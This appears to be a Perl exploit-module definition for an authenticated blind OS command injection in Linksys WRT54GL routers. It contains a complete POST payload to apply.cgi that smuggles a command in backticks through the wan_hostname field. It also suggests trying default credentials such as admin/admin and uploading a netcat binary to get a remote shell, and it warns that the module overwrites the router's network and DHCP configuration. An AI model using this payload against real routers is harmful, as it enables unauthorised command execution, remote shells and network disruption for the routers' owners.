my $EXPLOIT = {
  "DESCRIPTION" => "

          Some Linksys Routers are vulnerable to OS Command injection.

        You will need credentials to the web interface to access the vulnerable part

        of the application.

        Default credentials are always a good starting point. admin/admin or admin

        and blank password could be a first try.

        Note: This is a blind OS command injection vulnerability. This means that

        you will not see any output of your command. Try a ping command to your

        local system and observe the packets with tcpdump (or equivalent) for a first test.



        Hint: To get a remote shell you could upload a netcat binary and exec it.

        WARNING: this module will overwrite network and DHCP configuration.

      ",
  "METHOD" => "POST",
  "MSF_MODULE" => "linksys_wrt54gl_exec",
  "OSVDB" => 89421,
  "PATHS" => ["apply.cgi"],
  "PAYLOAD" => "submit_button=index&change_action=1&submit_type=1&action=Apply&now_proto=dhcp&daylight_time=1&lan_ipaddr=4&wait_time=0&need_reboot=0&ui_language=de&wan_proto=dhcp&router_name=__ROUTERNAME__&wan_hostname=`__CMD__`&wan_domain=__WANDOMAIN__&mtu_enable=1&wan_mtu=__WANMTU__&lan_ipaddr_0=__IP\\[0\\]__&lan_ipaddr_1=__IP\\[1\\]__&lan_ipaddr_2=__IP\\[2\\]__&lan_ipaddr_3=__IP\\[3\\]__&lan_netmask=__NETMASK__&lan_proto=dhcp&dhcp_check=1&dhcp_start=100&dhcp_num=50&dhcp_lease=0&wan_dns=4&wan_dns0_0=0&wan_dns0_1=0&wan_dns0_2=0&wan_dns0_3=0&wan_dns1_0=0&wan_dns1_1=0&wan_dns1_2=0&wan_dns1_3=0&wan_dns2_0=0&wan_dns2_1=0&wan_dns2_2=0&wan_dns2_3=0&wan_wins=4&wan_wins_0=0&wan_wins_1=0&wan_wins_2=0&wan_wins_3=0&time_zone=-08+1+1&_daylight_time=1&",
  "REFERENCES" => [
    "http://www.s3cur1ty.de/m1adv2013-01",
    "http://www.s3cur1ty.de/attacking-linksys-wrt54gl",
  ],
  "TITLE" => "Linksys WRT54GL Remote Command Execution",
  "TITLE OF THE ROUTER" => "cisco",
  "USER TO LOGIN WITH" => "admin",
  "WAN DOMAIN TITLE" => "test",
  VARIABLES => {
    'PATH' =>       {
  DESCRIPTION => "PATH to OS Command Injection",
  VALUE => "/apply.cgi",
},
    'CMD' =>       { DESCRIPTION => "The command to execute", VALUE => "ping 127.0.0.1" },
    'ROUTERNAME' =>       { DESCRIPTION => "", VALUE => "" },
    'WANDOMAIN' =>       { DESCRIPTION => "", VALUE => "" },
    'WANMTU' =>       { DESCRIPTION => "", VALUE => "" },
    'IP[0]' =>       { DESCRIPTION => "", VALUE => "" },
    'IP[1]' =>       { DESCRIPTION => "", VALUE => "" },
    'IP[3]' =>       { DESCRIPTION => "", VALUE => "" },
    'IP[2]' =>       { DESCRIPTION => "", VALUE => "" },
    'HTTPPASSWORD' =>       { DESCRIPTION => "Password to login with", VALUE => "password" },
    'NETMASK' =>       {
  DESCRIPTION => "LAN Netmask of the router",
  VALUE => "255.255.255.0",
},
    'WAN_MTU' =>       { DESCRIPTION => "WAN MTU", VALUE => 1500 },
  },
